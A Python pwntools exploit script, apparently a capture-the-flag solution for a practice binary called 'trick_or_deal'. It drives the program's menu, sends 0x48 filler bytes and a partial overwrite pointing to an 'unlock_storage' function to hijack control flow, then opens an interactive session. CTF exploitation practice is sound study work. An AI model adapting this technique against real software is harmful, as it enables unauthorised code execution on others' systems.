#!/usr/bin/env python3

from pwn import context, p16, remote, sys

context.binary = 'trick_or_deal'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    p.sendlineafter(b'[*] What do you want to do? ', b'4')

    p.sendlineafter(b'[*] What do you want to do? ', b'3')
    p.sendlineafter(b'[*] Are you sure that you want to make an offer(y/n): ', b'y')
    p.sendlineafter(b'[*] How long do you want your offer to be? ', str(0x50).encode())

    payload = b'A' * 0x48 + p16(context.binary.sym.unlock_storage & 0xffff)
    p.sendafter(b'[*] What can you offer me? ', payload)

    p.sendlineafter(b'[*] What do you want to do? ', b'1')
    p.interactive()


if __name__ == '__main__':
    main()
